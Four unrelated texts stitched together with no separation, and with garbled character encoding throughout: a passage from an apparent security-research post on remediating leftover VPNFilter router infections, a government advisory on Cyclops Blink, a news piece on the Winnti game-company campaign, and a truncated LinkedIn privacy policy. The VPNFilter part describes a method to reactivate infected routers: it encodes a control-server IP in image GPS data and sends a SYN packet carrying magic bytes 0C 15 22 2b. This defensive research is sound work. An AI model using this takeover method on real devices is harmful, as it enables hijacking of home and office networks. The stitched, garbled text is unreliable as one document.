initial findings from Cisco Talos. However, this leaves leftover infections, which is the original listener setup by the first-stage malware. In our recent paper titled âWorm War: The Botnet Battle for IoT Territory,â we covered the aspect of botnets removing the infections of other botnets and the ease with which these IoT devices can be compromised. At times, it seems that threat actors are the few people who have access to some of these systems and are the ones removing malware types like VPNFilter. Itâs worth noting that this kind of access might not be available to all users in the first place. As an example, when the FBI took down part of the botnetâs network infrastructure, they recommended end users to restart their devices. However, many users have routers that were provided by their ISP. Often, this type of end users would therefore not have login access to the router. As a result, without their ISPâs permission, they cannot update the firmware to get the latest vulnerability fixes. As we will discuss here, this is precisely the reason that the FBI worked with Shadowserver to add the extra safeguard of sinkholing the botnet. Still, we did find examples where vendors published updates and guidance to remediate the infection. Netgear and MikroTik, for instance, have stated that upgrading the firmware would remediate the malwareâs effects and prevent further infections. As of writing, however, we have not encountered any one organization in the IoT space that has committed to clean up vulnerabilities and infections. Due to the lack of a standard group or mechanism for updates, the owners of these IoT devices often need to manually go to their vendorâs website, download a firmware file, then upload it to the device. Very few seem to have automatic firmware update procedures in place. These observations have spurred us to ask the following questions with regard to the remaining VPNFIlter infections: The Shadowserver Foundation is a nonprofit security organization whose mission is to â... make the Internet more secure by bringing to light vulnerabilities, malicious activity and emerging threats."" Recently, Trend Micro has partnered with Shadowserver to provide funding for their cause over the next three years. Given this partnership and the work that Cisco Talos, the FBI, and the US Department of Justice (with the support of Shadowserver) had already done in the past to sinkhole VPNFilterâs second domain (toknowall[.]com), we wanted to work with Shadowserver to collect data from any available stats that they might have, such as how many infections are still out there. We also wanted to suggest ways to clean up any leftover VPNFilter infections. This is of particular importance, as cleaning these devices is far from trivial for end users. This is precisely the reason that it was so important for these organizations to carry out the sinkhole in the first place. First, we needed to get a better understanding of the malware, find out how it worked, and from there determine if anything else could be added to the takedown processes that were already being done.Â  As shown in the image above, when Shadowserver started the sinkhole, they saw an initial spike of over 14,000 networks infected in the first two months; over time, that has been reduced to 5,447. This shows that even after over two years, there is still a sizeable number of infections left. Most notably, at this rate, the infections will likely still be around for years to come, until perhaps these devices are physically swapped out â a common trend in IoT botnets. Not only does this tie to our main point that IoT botnets are to some degree nearly âuncleanable,â it also makes VPNFilter a botnet that is ripe for taking over by another threat actor for them to utilize, as we will explain later on. Technical details As stated in the original publication by Cisco Talos, the first stage seeks to download the second-stage malware from an IP address received using the following scheme: This logic is presented in Figure 4. We wanted to verify the effectivity of the solutions against the first and second phases of the first stage. Mainly, this means that to see the effectivity of the sinkhole, it is necessary to check for victims that are still infected. In case there are still infected victims, it is necessary to try to think of a solution to permanently clean up these devices. One key thing that we discovered from the outset was that even though the first phase (the image in Photobucket) was already taken down and the second phase (alternative domain) sinkholed, unless the malware receives a valid Image file from the sinkhole, it would still enter its third phase where attackers could potentially regain control. Ironically, while this might seem like bad news, this showed us an opening for a solution, as we will discuss later on. Here we detail our findings on the first and second phases for this initial stage. Photobucket[.]com C&C All the URLs pointing to Photobucket[.]com were already taken down, which means that the pictures hosted there were also removed. Therefore, the only two possible options for currently infected devices would be to reach out to toknowall[.]com or to start listening to TCP packets while expecting a specially crafted packet containing the IP address of the second stage server. For our next step, we verified how many real victim devices were left communicating with the sinkhole and how many of these had already moved to listening mode. toknowall[.]com C&C We then verified if it would be possible to inject our own image with a C&C IP address controlled by us, to see how many hosts would respond. For this, we had to dig deeper in the malware logic to extract the C&C IP address from the image downloaded from either Photobucket[.]com or toknowall[.]com. The algorithm calculates each of the four octets of an IPv4 address out of the GPS information contained in the Exif header of the downloaded image file. The two values used are GPSLatitude and GPSLongitude. Each of these consists of three values (degrees, minutes, and seconds) stored as rationals (64-bit numbers split into two 32-bit integers). The first 32-bit number is called a numerator and the second is called a denominator. The theory behind this is better explained Soufiane Tahiriâs book, âMastering Mobile Forensics.â In the case of VPNFilter, these coordinates are used like this: As can be seen from Figure 5, the denominator part of all coordinates is ignored by the malware. The numerator, however, is used to generate the values of all octets. We wrote a program to replace these bytes in the image that we created. The code that does the job can be seen in Figure 6. In the preceding code, the first coordinate is located at position 4500 (decimal) in the image. We could have parsed the whole Exif header, but we needed something quicker. Also, in lines 48 and 51, we set the numerator part of the degree value for both latitude and longitude to zero so that we could leverage the negative integer values in C to write the exact bytes that we needed. By using our program, we were able to inject an IP address that points back to the sinkhole owned by Shadowserver to see how many infected devices are still actively looking for a second stage download server and more importantly, to prevent the still-infected networks from moving to stage oneâs third phase (listening to all TCP packets) in the future.Â  Figure 7 shows the resulting image that we used. This image was then supplied to Shadowserver who are in the process of deploying it. While this is being done, we went to look for victims in a specific stage of the infection. Listening mode If the malware does not get a valid image from previous stages, it will then enter into listening mode. This allows the attackers to regain control over infected victims if the sinkholed alternative domain does not serve a valid image. Figure 8 shows the source code that makes this third option possible. The above code lets the malware listen to all packets and expects one TCP packet with the SYN flag that is at least 8-bytes long. The magic sequence expected is a hexadecimal 0C 15 22 2b. After verifying the logic, our next step was to generate the packet. The easiest way that we could think of doing this was to use hping3 since this tool is capable of sending any type of network packet. We used the code seen in Figure 10. We then asked Shadowserver to scan the infected devices that they have logged throughout the years to see how many would respond. Here are the results for the unique 5,447 devices that were found still connecting to the sinkhole on a single day. It is important to remember that because these are routers and other similar types of devices, this number also represents thousands of infected networks, not simply individual machines. This means that the reach and visibility for attackers with a botnet like this can be substantial. Also, the number of infected hosts might be higher than what Shadowserver sees on their sinkhole, as the domain toknowall[.]com is a well-known C&C and can be blocked at the DNS level by DNS providers or other security products. Here we summarize our main findings and show the geolocation data. Infections seem to be led by USA, followed by Russia, according to geolocation data from the hosts that reached back to our sinkholed server. Although only 363 networks connected back to our sinkhole, we cannot assume that the 1,801 networks that gave us an initial positive response are clean. They might still be infected by VPNFilter, but the connection to our sinkhole could have been blocked if they are behind a firewall. These 363 networks can be taken over by anyone with an understanding of how the malware works. From a technical perspective, there was nothing to prevent the takeover of these devices. Additionally, at any point in time the original actors could take control of the devices that are already infected. Conclusion and recommendations Even though solutions have been deployed to lower the effectivity of VPNFilter (which has been known for over two years), for end users restarting is still not enough to protect their devices from reinfection. To reiterate, this is why the initial sinkhole was so important. While it's not likely to have the malicious actor still on infected systems, the malware can still have a potential negative impact. With just a bit of understanding, another malicious actor can have the botnet reactivated. This is exactly why we worked with Shadowserver to upgrade the second stage sinkhole with a valid image to prevent the malware from moving forward to its listening mode, which occurs in the third phase of the first stage. A firmware update would also remediate this problem. However, as mentioned earlier, firmware updates become problematic and in most cases, are not as easy as in PC ecosystems. The major hurdles involve verifying that the firmware file is legitimate and understanding how to apply the updates to the system. This would be assuming, however, that users even have access to the router to perform upgrades in the first place, as well as that their deviceâs vendor has an upgrade available for their model. In many cases, someone else was responsible for setting up the device for the user, such as the company that they bought it from, or their ISP. To compound all of this, getting a new router might also be problematic if users donât own the router, so they might have to wait for their ISP to provide a new router. These limitations and challenges that are faced by the users on their side bring us to where we are and why the numbers of VPNFilter infections are still at the levels that are being seen on the internet. Moving forward, the approach would be to keep the sinkhole running with the fixes that we have implemented. This limits the ability of this specific malware to become active again. It also gives time for devices to naturally go offline with a normal life span. The need for such an approach emphasizes the importance for the existence and operations of organizations like Shadowserver, as they serve as custodians of the internet. This is precisely why Trend Micro made the commitment earlier this year to support Shadowserver. Ordinary end users can also do their part in making sure that the IoT remains safe from the hands of cybercriminals thereby preventing the success of their future campaigns. One of the best ways to minimize potential infection from IoT-malware is to limit the number of exposures one has to the internet. This means, in most cases, disabling any remote management options in the configuration. Also, disabling Universal Plug-and-Play (UPnP) if the option is available, as this setting might expose services to the internet without the awareness of their users. Updating devices as regularly as needed to the latest firmware also provides the latest security features and bug fixes that might be used in attacks against systems. Applying general security practices can also minimize the chances of IoT-malware infecting routers and other devices. At present, given the prolonged work-from-home (WFH) setups, users should reexamine their current security measures as home devices and systems now have a heavier influence on corporate networks. In our paper âWorm War: The Botnet Battle for IoT Territory,â we show how these devices are both actively attacked and are relatively simple to compromise. We would now like to extend our messaging to say that these router infections are never cleaned and can be active even years after a botnet has supposedly been offline. Although we have used VPNFilter to elaborate, itâs important to emphasize that this is true of any other IoT botnet. Indeed, this will keep happening unless users take care of their router frequently and router manufacturers start adding auto-update features to their devicesâ operating systems. In the meantime, the security industry faces an uphill battle against infections that cease to be a threat only when the router is finally replaced.

               Search The Sandworm actor, which the United Kingdom and the United States have previously attributed to the Russian GRU, has replaced the exposed VPNFilter malware with a new more advanced framework. The United Kingdom's (UK) National Cyber Security Centre (NCSC), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) in the U.S. have identified that the actor known as Sandworm or Voodoo Bear is using a new malware, referred to here as Cyclops Blink. The NCSC, CISA, and the FBI have previously attributed the Sandworm actor to the Russian General Staff Main Intelligence Directorateâs Russian (GRUâs) Main Centre for Special Technologies (GTsST). The malicious cyber activity below has previously been attributed to Sandworm: Cyclops Blink appears to be a replacement framework for the VPNFilter malware exposed in 2018, and which exploited network devices, primarily small office/home office (SOHO) routers and network attached storage (NAS) devices. This advisory summarizes the VPNFilter malware it replaces, and provides more detail on Cyclops Blink, as well as the associated tactics, techniques and procedures (TTPs) used by Sandworm. An NCSC malware analysis report on Cyclops Blink is also available. It also provides mitigation measures to help organizations defend against malware. Click here for a PDF version of this report. A series of articles published by Cisco Talos in 2018 describes VPNFilter and its modules in detail. VPNFilter was deployed in stages, with most functionality in the third-stage modules. These modules enabled traffic manipulation, destruction of the infected host device, and likely enabled downstream devices to be exploited. They also allowed monitoring of Modbus SCADA protocols, which appears to be an ongoing requirement for Sandworm, as also seen in their previous attacks against ICS networks. VPNFilter targeting was widespread and appeared indiscriminate, with some exceptions: Cisco Talos reported an increase of victims in Ukraine in May 2018. Sandworm also deployed VPNFilter against targets in the Republic of Korea before the 2018 Winter Olympics.Â  In May 2018, Cisco Talos published the blog that exposed VPNFilter and the U.S. Department of Justice linked the activityÂ to Sandworm and announced efforts to disrupt the botnet. A TrendmicroÂ blog in January 2021 detailed residual VPNFilter infections and provided data which showed that although there had been a reduction in requests to a known C2 domain, there was still more than a third of the original number of first-stage infections. Sandworm has since shown limited interest in existing VPNFilter footholds, instead preferring to retool. The NCSC, CISA, the FBI, and NSA, along with industry partners, have now identified a large-scale modular malware framework (T1129)Â which is targeting network devices. The new malware is referred to here asÂ Cyclops BlinkÂ and has been deployed since at least June 2019, fourteen months after VPNFilter was disrupted. In common with VPNFilter, Cyclops Blink deployment also appears indiscriminate and widespread. The actor has so far primarily deployed Cyclops Blink to WatchGuard devices, but it is likely that Sandworm would be capable of compiling the malware for other architectures and firmware. Note: Note that only WatchGuard devices that were reconfigured from the manufacturer default settings to open remote management interfaces to external access could be infected The malware itself is sophisticated and modular with basic core functionality to beacon (T1132.002) device information back to a server and enable files to be downloaded and executed. There is also functionality to add new modules while the malware is running, which allows Sandworm to implement additional capability as required. The NCSC has published a malware analysis reportÂ on Cyclops Blink which provides more detail about the malware. Post exploitation, Cyclops Blink is generally deployed as part of a firmware âupdateâ (T1542.001). This achieves persistence when the device is rebooted and makes remediation harder. Victim devices are organized into clusters and each deployment of Cyclops Blink has a list of command and control (C2) IP addresses and ports that it uses (T1008). All the known C2 IP addresses to date have been used by compromised WatchGuard firewall devices. Communications between Cyclops Blink clients and servers are protected under Transport Layer Security (TLS) (T1071.001), using individually generated keys and certificates. Sandworm manages Cyclops Blink by connecting to the C2 layer through the Tor network.  Cyclops Blink persists on reboot and throughout the legitimate firmware update process. Affected organizations should therefore take steps to remove the malware.Â  WatchGuard has worked closely with the FBI, CISA, NSA and the NCSC, and has provided tooling and guidance to enable detection and removal of Cyclops Blink on WatchGuard devices through a non-standard upgrade process. Device owners should follow each step in these instructions to ensure that devices are patched to the latest version and that any infection is removed. The tooling and guidance from WatchGuard can be found at:Â https://detection.watchguard.com/. In addition: Please refer to the accompanying Cyclops Blink malware analysis reportÂ for indicators of compromise which may help detect this activity.Â  This advisory has been compiled with respect to the MITRE ATT&CKÂ® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. Tactic Technique Procedure Initial Access T1133 External Remote Services The actors most likely deploy modified device firmware images by exploiting an externally available service Execution T1059.004 Command and Scripting Interpreter: Unix Shell Cyclops Blink executes downloaded files using the Linux API Persistence T1542.001 Pre-OS Boot: System Firmware Cyclops Blink is deployed within a modified device firmware image T1037.004 Boot or Logon Initialization Scripts: RC Scripts Cyclops Blink is executed on device startup, using a modified RC script Â  T1562.004 Impair Defenses: Disable or Modify System Firewall Cyclops Blink modifies the Linux system firewall to enable C2 communication Â  T1036.005 Masquerading: Match Legitimate Name or Location Cyclops Blink masquerades as a Linux kernel thread process Discovery T1082 System Information Discovery Cyclops Blink regularly queries device information Command and Control T1090 Proxy T1132.002 Data Encoding: Non-Standard Encoding Cyclops Blink command messages use a custom binary scheme to encode data T1008 Fallback Channels Cyclops Blink randomly selects a C2 server from contained lists of IPv4 addresses and port numbers T1071.001 Application Layer Protocol: Web Protocols Cyclops Blink can download files via HTTP or HTTPS T1573.002 Encrypted Channel: Asymmetric Cryptography Cyclops Blink C2 messages are individually encrypted using AES-256-CBC and sent underneath TLS T1571 Non-Standard Port The list of port numbers used by Cyclops Blink includes non-standard ports not typically associated with HTTP or HTTPS traffic T1041 Exfiltration Over C2 Channel Cyclops Blink can upload files to a C2 server A Cyclops Blink infection does not mean that an organization is the primary target, but it may be selected to be, or its machines could be used to conduct attacks. Organizations are advised to follow the mitigation advice in this advisory to defend against this activity, and to refer to indicators of compromise (not exhaustive) in the Cyclops Blink malware analysis report to detect possible activity on networks.Â  UK organizations affected by the activity outlined in should report any suspected compromises to the NCSC atÂ https://report.ncsc.gov.uk/. A variety of mitigations will be of use in defending against the malware featured in this advisory: This advisory is the result of a collaborative effort by United Kingdomâs National Cyber Security Centre (NCSC), the United Statesâ National Security Agency (NSA), the Federal Bureau of Investigation (FBI), and Department of Homeland Security (DHS) Cybersecurity and Infrastructure Security Agency (CISA).Â  CISA, FBI, and NSA agree with this attribution and the details provided in the report.

 Researchers have uncovered an ongoing cyberespionage campaign targeting more than 30 online video game companies over the past four years. The companies infected by the malware primarily market so-called massively multiplayer online role-playing games. They're mostly located in South East Asia, but are also in the US, Germany, Japan, China, Russia, Brazil, Peru, and Belarus, according to a release published Thursday by researchers from antivirus provider Kaspersky Lab. The attackers work from computers with Chinese and Korean language configurations. They used their unauthorized access to obtain digital certificates that were later exploited in malware campaigns targeting other industries and political activists. So far, there's no evidence that customers of the infected game companies were targeted, although in at least one case, malicious code was accidentally installed on gamers' computers by one of the infected victim companies. Kaspersky said there was another case of end users being infected by the malware, which is known as ""Winnti."" The company didn't rule out the possibility that players could be hit in the future, potentially as a result of collateral damage. ""Having infected gaming companies that do business in MMORPG, the attackers potentially get access to millions of users,"" the researchers wrote. ""So far we don't have data that the attackers stole from common users but we do have at least two incidents when Winnti malware had been planted on an online game update server and [this] malicious executable was spread among large number of the game fans. The samples we have observed seemed not to be malware targeted for the game fans but a malware module which accidentally got into [the] wrong place. But a potential of attackers to misuse such access to infect hundreds of millions of Internet users creates a great risk."" Digital certificates stolen in some of the heists have been used to sign malware that targeted Tibetan and Uyghur activists. The cryptographic certificates have also been exploited in attacks that have hit companies in the aerospace industry. Attackers frequently abuse stolen certificates to prevent the malware they're spreading from being detected by various security protections. In addition to stealing digital certificates, the Winnti gang's campaign appears to be motivated by the desire to manipulate in-game currency, such as ""runes"" or ""gold,"" that can in many cases be converted into real currency. The attackers may also want to use source code stolen from the game companies so it can be deployed in rogue servers offering pirated versions of the games. Kaspersky has more here.

 Effective August 11, 2020 Our Privacy Policy has been updated. LinkedInâs mission is to connect the worldâs professionals to allow them to be more productive and successful. Central to this mission is our commitment to be transparent about the data we collect about you, how it is used and with whom it is shared. This Privacy Policy applies when you use our Services (described below). We offer our users choices about the data we collect, use and share as described in this Privacy Policy, Cookie Policy, Settings and our Help Center. ï»¿Settings are available to Members of LinkedIn and Visitors are provided separate controls. Learn More. We are a social network and online platform for professionals. People use our Services to find and be found for business opportunities, to connect with others and find information. Our Privacy Policy applies to any Member or Our registered users (âMembersâ) share their professional identities, engage with their network, exchange knowledge and professional insights, post and view relevant content, learn and develop skills, and find business and career opportunities. Content and data on some of our Services is viewable to non-members (âVisitorsâ). We use the term âDesignated Countriesâ to refer to countries in the European Union (EU), European Economic Area (EEA), and Switzerland. This Privacy Policy, including our Cookie Policy applies to your use of our Services. This Privacy Policy applies to LinkedIn.com, LinkedIn-branded apps, LinkedIn Learning and other LinkedIn-related sites, apps, communications and services (âServicesâ), including off-site Services, such as our ad services and the âApply with LinkedInâ and âShare with LinkedInâ plugins, but excluding services that state that they are offered under a different privacy policy. For California residents, additional disclosures required by California law may be found in our California Privacy Disclosure. If you are in the âDesignated Countriesâ, LinkedIn Ireland Unlimited Company (âLinkedIn Irelandâ) will be the controller of your personal data provided to, or collected by or for, or processed in connection with our Services. If you are outside of the Designated Countries, LinkedIn Corporation will be the controller of your personal data provided to, or collected by or for, or processed in connection with, our Services. As a Visitor or Member of our Services, the collection, use and sharing of your personal data is subject to this Privacy Policy and other documents referenced in this Privacy Policy, as well as updates. Changes to the Privacy Policy apply to your use of our Services after the âeffective date.â LinkedIn (âweâ or âusâ) can modify this Privacy Policy, and if we make material changes to it, we will provide notice through our Services, or by other means, to provide you the opportunity to review the changes before they become effective. If you object to any changes, you may close your account. You acknowledge that your continued use of our Services after we publish or send a notice about our changes to this Privacy Policy means that the collection, use and sharing of your personal data is subject to the updated Privacy Policy, as of its effective date. You provide data to create an account with us. To create an account you need to provide data including your name, email address and/or mobile number, and a password. If you register for a premium Service, you will need to provide payment (e.g., credit card) and billing information. You create your LinkedIn profile (a complete profile helps you get the most from our Services). You have choices about the information on your profile, such as your education, work experience, skills, photo, city or area and endorsements. You donât have to provide additional information on your profile; however, profile information helps you to get more from our Services, including helping recruiters and business opportunities find you. Itâs your choice whether to include sensitive information on your profile and to make that sensitive information public. Please do not post or add personal data to your profile that you would not want to be publicly available. You give other data to us, such as by syncing your address book or calendar. We collect personal data from you when you provide, post or upload it to our Services, such as when you fill out a form, (e.g., with demographic data or salary), respond to a survey, or submit a resume or fill out a job application on our Services. If you opt to import your address book, we receive your contacts (including contact information your service provider(s) or app automatically added to your address book when you communicated with addresses or numbers not already in your list). If you sync your contacts or calendars with our Services, we will collect your address book and calendar meeting information to keep growing your network by suggesting connections for you and others, and by providing information about events, e.g. times, places, attendees and contacts. You donât have to post or upload personal data; though if you donât, it may limit your ability to grow and engage with your network over our Services. Others may post or write about you. You and others may post content that includes information about you (as part of articles, posts, comments, videos) on our Services. We also may collect public information about you, such as professional-related news and accomplishments, and make it available as part of our Services, including, as permitted by your settings, in notifications to others of mentions in the news. Others may sync their contacts or calendar with our Services We receive personal data (including contact information) about you when others import or sync their contacts or calendar with our Services, associate their contacts with Member profiles, scan and upload business cards, or send messages using our Services (including invites or connection requests). If you or others opt-in to sync email accounts with our Services, we will also collect âemail headerâ information that we can associate with Member profiles. Customers and partners may provide data to us. We receive personal data (e.g., your job title and work email address) about you when you use the services of our customers and partners, such as employers or prospective employers and applicant tracking systems providing us job application data. We receive data about you when you use some of the other services provided by us or our affiliates, including Microsoft. For example, you may choose to send us information about your contacts in Microsoft apps and services, such as Outlook, for improved professional networking activities on our Services We log your visits and use of our Services, including mobile apps. We log usage data when you visit or otherwise use our Services, including our sites, app and platform technology, such as when you view or click on content (e.g., learning video) or ads (on or off our sites and apps), perform a search, install or update one of our mobile apps, share articles or apply for jobs. We use log-ins, cookies, device information and internet protocol (âIPâ) addresses to identify you and log your use. We collect data through cookies and similar technologies. As further described in our Cookie Policy, we use cookies and similar technologies (e.g., pixels and ad tags) to collect data (e.g., device IDs) to recognize you and your device(s) on, off and across different services and devices where you have engaged with our Services. We also allow some others to use cookies as described in our Cookie Policy. If you are outside the Designated Countries, we also collect (or rely on others who collect) information about your device where you have not engaged with our Services (e.g., ad ID, IP address, operating system and browser information) so we can provide our Members with relevant ads and better understand their effectiveness. Learn more. You can opt out from our use of data from cookies and similar technologies that track your behavior on the sites of others for ad targeting and other ad-related purposes. For Visitors, the controls are here. We receive data through cookies and similar technologies When you visit or leave our Services (including some plugins and our cookies or similar technology on the sites of others), we receive the URL of both the site you came from and the one you go to and the time of your visit. We also get information about your network and device (e.g., IP address, proxy server, operating system, web browser and add-ons, device identifier and features, cookie IDs and/or ISP, or your mobile carrier). If you use our Services from a mobile device, that device will send us data about your location based on your phone settings. We will ask you to opt-in before we use GPS or other tools to identify your precise location. If you communicate through our Services, we learn about that. We collect information about you when you send, receive, or engage with messages in connection with our Services. For example, if you get a LinkedIn connection request, we track whether you have acted on it and will send you reminders. We also use automatic scanning technology on messages to support and protect our site. For example, we use this technology to suggest possible responses to messages and to manage or block content that violates our User Agreement or Professional Community Policies from our Services. When your organization (e.g., employer or school) buys a premium Service for you to use, they give us data about you. Others buying our Services for your use, such as your employer or your school, provide us with personal data about you and your eligibility to use the Services that they purchase for use by their workers, students or alumni. For example, we will get contact information for âCompany Pageâ administrators and for authorizing users of our premium Services, such as our recruiting, sales or learning products. We get data when you visit sites that include our ads, cookies or some of our plugins or when you log-in to othersâ services with your LinkedIn account. We receive information about your visits and interaction with services provided by others when you log-in with LinkedIn or visit othersâ services that include some of our plugins (such as âApply with LinkedInâ) or our ads, cookies or similar technologies. We are improving our Services, which means we get new data and create new ways to use data. Our Services are dynamic, and we often introduce new features, which may require the collection of new information. If we collect materially different personal data or materially change how we collect, use or share your data, we will notify you and may also modify this Privacy Policy. Affiliates are companies controlling, controlled by or under common control with us, including, for example, LinkedIn Ireland, LinkedIn Corporation, LinkedIn Singapore and Microsoft Corporation. We use your data to provide, support, personalize and develop our Services. How we use your personal data will depend on which Services you use, how you use those Services and the choices you make in your settings. We use the data that we have about you to provide and personalize our Services, including with the help of automated systems and inferences we make, so that our Services (including ads) can be more relevant and useful to you and others. Our Services help you connect with others, find and be found for work and business opportunities, stay informed, get training and be more productive. We use your data to authorize access to our Services and honor your settings. Our Services allow you to stay in touch and up to date with colleagues, partners, clients, and other professional contacts. To do so, you can âconnectâ with the professionals who you choose, and who also wish to âconnectâ with you. Subject to your and their settings, when you connect with other Members, you will be able to search each othersâ connections in order to exchange professional opportunities. We use data about you (such as your profile, profiles you have viewed or data provided through address book uploads or partner integrations) to help others find your profile, suggest connections for you and others (e.g. Members who share your contacts or job experiences) and enable you to invite others to become a Member and connect with you. You can also opt-in to allow us to use your precise location or proximity to others for certain tasks (e.g. to suggest other nearby Members for you to connect with, calculate the commute to a new job, or notify your connections that you are at a professional event). It is your choice whether to invite someone to our Services, send a connection request, or allow another Member to become your connection. When you invite someone to connect with you, your invitation will include your network and basic profile information (e.g., name, profile photo, job title, region). We will send invitation reminders to the person you invited. You can choose whether or not to share your own list of connections with your connections. Visitors have choices about how we use their data. Our Services allow you to stay informed about news, events and ideas regarding professional topics you care about, and from professionals you respect. Our Services also allow you to improve your professional skills, or learn new ones. We use the data we have about you (e.g., data you provide, data we collect from your engagement with our Services and inferences we make from the data we have about you), to personalize our Services for you, such as by recommending or ranking relevant content and conversations on our Services. We also use the data we have about you to suggest skills you could add to your profile and skills that you might need to pursue your next opportunity. So, if you let us know that you are interested in a new skill (e.g., by watching a learning video), we will use this information to personalize content in your feed, suggest that you follow certain members on our site, or suggest related learning content to help you towards that new skill. We use your content, activity and other data, including your name and photo, to provide notices to your network and others. For example, subject to your settings, we may notify others that you have updated your profile, posted content, took a social action, used a feature, made new connections or were mentioned in the news. Our Services allow you to explore careers, evaluate educational opportunities, and seek out, and be found for, career opportunities. Your profile can be found by those looking to hire (for a job or a specific task) or be hired by you. We will use your data to recommend jobs or mentees, show you and others relevant professional contacts (e.g., who work at a company, in an industry, function or location or have certain skills and connections). You can signal that you are interested in changing jobs and share information with recruiters. We will use your data to recommend jobs to you and you to recruiters. We may use automated systems to provide content and recommendations to help make our Services more relevant to our Members, Visitors and customers. Keeping your profile accurate and up-to-date may help you better connect to others and to opportunities through our Services. Our Services allow you to collaborate with colleagues, search for potential clients, customers, partners and others to do business with. Our Services allow you to communicate with other Members and schedule and prepare meetings with them. If your settings allow, we scan messages to provide âbotsâ or similar tools that facilitate tasks such as scheduling meetings, drafting responses, summarizing messages or recommending next steps. Learn more. Our premium Services help paying users to search for and contact Members through our Services, such as searching for and contacting job candidates, sales leads and co-workers, manage talent and promote content through social  We sell premium Services that provide our customers and subscribers with customized-search functionality and tools (including messaging and activity alerts) as part of our talent, marketing and sales solutions. Customers can export limited information from your profile, such as name, headline, current company, current title, and general location (e.g., Dublin), such as to manage sales leads or talent, unless you opt-out. We do not provide contact information to customers as part of these premium Services without your consent. Premium Services customers can store information they have about you in our premium Services, such as a resume or contact information or sales history. The data stored about you by these customers is subject to the policies of those customers. Other enterprise Services and features that use your data include TeamLink and Elevate (social promotion of content). We contact you and enable communications between Members. We offer settings to control what messages you receive and how often you receive some types of messages. We will contact you through email, mobile phone, notices posted on our websites or apps, messages to your LinkedIn inbox, and other ways through our Services, including text messages and push notifications. We will send you messages about the availability of our Services, security, or other service-related issues. We also send messages about how to use our Services, network updates, reminders, job suggestions and promotional messages from us and our partners. You may change your communication preferences at any time. Please be aware that you cannot opt out of receiving service messages from us, including security and legal notices. We also enable communications between you and others through our Services, including for example invitations, InMail, groups and messages between connections. We serve you tailored ads both on and off our Services. We offer you choices regarding personalized ads, but you cannot opt-out of seeing other ads. We target (and measure the performance of) ads to Members, Visitors and others both on and off our Services directly or through a variety of partners, using the following data, whether separately or combined: We will show you ads called sponsored content which look similar to non-sponsored content, except that they are labeled as advertising (e.g., as âadâ or âsponsoredâ). If you take a social action (such as like, comment or share) on these ads, your action is associated with your name and viewable by others, including the advertiser. Subject to your settings, if you take a social action on the LinkedIn Services, that action may be mentioned with related ads. For example, when you like a company we may include your name and photo when their sponsored content is shown. We adhere to self-regulatory principles for interest-based advertising and participate in industry opt-outs from such ads. This does not opt you out of receiving advertising; you will continue to get other ads by advertisers not listed with these self regulatory tools. You can also opt-out specifically from our uses of certain categories of data to show you more relevant ads. For Visitors, the setting is here. We do not share your personal data with any third-party advertisers or ad networks except for: (i) hashed IDs or device identifiers (to the extent they are personal data in some countries); (ii) with your separate permission (e.g., in a lead generation form) or (iii) data already visible to any users of the Services (e.g., profile). However, if you view or click on an ad on or off our Services, the ad provider will get a signal that someone visited the page that displayed the ad, and they may, through the use of mechanisms such as cookies, determine it is you. Advertising partners can associate personal data collected by the advertiser directly from you with hashed IDs or device identifiers received from us. In such instances, we seek to contractually require such advertising partners to obtain your explicit, opt-in consent before doing so. We promote our Services to you and others. In addition to advertising our Services, we use Membersâ data and content for invitations and communications promoting membership and network growth, engagement and our Services, such as by showing your connections that you have used a feature on our Services. We develop our Services and conduct research We use data, including public feedback, to conduct research and development for our Services in order to provide you and others with a better, more intuitive and personalized experience, drive membership growth and engagement on our Services, and help connect professionals to each other and to economic opportunity. We seek to create economic opportunity for Members of the global workforce and to help them be more productive and successful. We use the personal data available to us to research social, economic and workplace trends, such as jobs availability and skills needed for these jobs and policies that help bridge the gap in various industries and geographic areas. In some cases, we work with trusted third parties to perform this research, under controls that are designed to protect your privacy. We publish or allow others to publish economic insights, presented as aggregated data rather than personal data. Polls and surveys are conducted by us and others through our Services. You are not obligated to respond to polls or surveys, and you have choices about the information you provide. You may opt-out of survey invitations. We use data to help you and fix problems. We use data (which can include your communications) to investigate, respond to and resolve complaints and for Service issues (e.g., bugs). We use data to generate insights that do not identify you. We use your data to produce and share insights that do not identify you. For example, we may use your data to generate statistics about our members, their profession or industry, to calculate ad impressions served or clicked on, or to publish visitor demographics for a Service or create demographic workforce insights. We use data for security, fraud prevention and investigations. We use your data (including your communications) for security purposes or to prevent or investigate possible fraud or other violations of our User Agreement and/or attempts to harm our Members, Visitors or others. E.g. like, comment, follow, share  Partners include ad networks, exchanges and others  Any data that you include on your profile and any content you post or social action (e.g., likes, follows, comments, shares) you take on our Services will be seen by others, consistent with your settings. Your profile is fully visible to all Members and customers of our Services. Subject to your settings, it can also be visible to others on or off of our Services (e.g., Visitors to our Services or users of third- party search engines). As detailed in our Help Center, your settings, degree of connection with the viewing Member, the subscriptions they may have, their usage of our Services, access channels and search types (e.g., by name or by keyword) impact the availability of your profile and whether they can view certain fields in your profile. Our Services allow viewing and sharing information including through posts, likes, follows and comments. Your employer can see how you use Services they provided for your work (e.g. as a recruiter or sales agent) and related information. We will not show them your job searches or personal messages. Your employer may offer you access to our enterprise Services such as Recruiter, Sales Navigator, LinkedIn Learning or our advertising Campaign Manager. Your employer can review and manage your use of such enterprise Services. Depending on the enterprise Service, before you use such Service, we will ask for permission to share with your employer relevant data from your profile or use of our non-enterprise Services. For example, users of Sales Navigator will be asked to share their âsocial selling indexâ, a score calculated in part based on their personal account activity. We understand that certain activities such as job hunting and personal messages are sensitive, and so we do not share those with your employer unless you choose to share it with them through our Services (for example, by applying for a new position in the same company or mentioning your job hunting in a message to a co-worker through our Services). Subject to your settings, when you use workplace tools and services (e.g., interactive employee directory tools) certain of your data may also be made available to your employer or be connected with information we receive from your employer to enable these tools and services. Regulated Members may need to store communications outside of our Service. Some Members (or their employers) need, for legal or professional compliance, to archive their communications and social media activity, and will use services of others to provide these archival services. We enable archiving of messages by and to those Members outside of our Services. For example, a financial advisor needs to archive communications with her clients through our Services in order to maintain her professional financial advisor license.     Subject to your settings, other services may look up your profile. When you opt to link your account with other services, personal data will become available to them. The sharing and use of that personal data will be described in, or linked to, a consent screen when you opt to link the accounts. For example, you may link your Twitter or WeChat account to share content from our Services into these other services, or your email provider may give you the option to upload your LinkedIn contacts into its own service. Third-party services have their own privacy policies, and you may be giving them permission to use your data in ways we would not. You may revoke the link with such accounts. Subject to your settings, excerpts from your profile will appear on the services of others 